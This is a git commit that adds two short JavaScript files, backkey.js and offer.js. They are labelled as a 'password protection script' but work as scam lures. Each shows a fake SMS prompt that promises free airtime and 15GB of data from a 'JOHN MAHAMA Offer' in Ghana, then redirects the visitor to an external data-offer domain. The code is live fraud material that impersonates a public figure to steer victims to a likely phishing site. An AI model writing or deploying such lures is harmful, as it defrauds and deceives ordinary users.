7fd3f54fc667b202f48c106a6c43e0c2137a4894
uptomars <Kenoly555+me@gmail.com>
2025-12-13 06:06:03 +0100

    Add files via upload

---
+++ backkey.js
@@ -0,0 +1,6 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = '15GB Free Data'
+password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
+if (password != '15GB Free Data') {
+location.href='https://mahama.data-offer.xyz/15GB';
+}
---
+++ offer.js
@@ -0,0 +1,7 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = '0k'
+password=prompt('SMS: Welcome to Ghana GH₵10 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
+if (password != 'ok') {
+location.href='https://mahama.data-offer.xyz/15GB';
+
+}
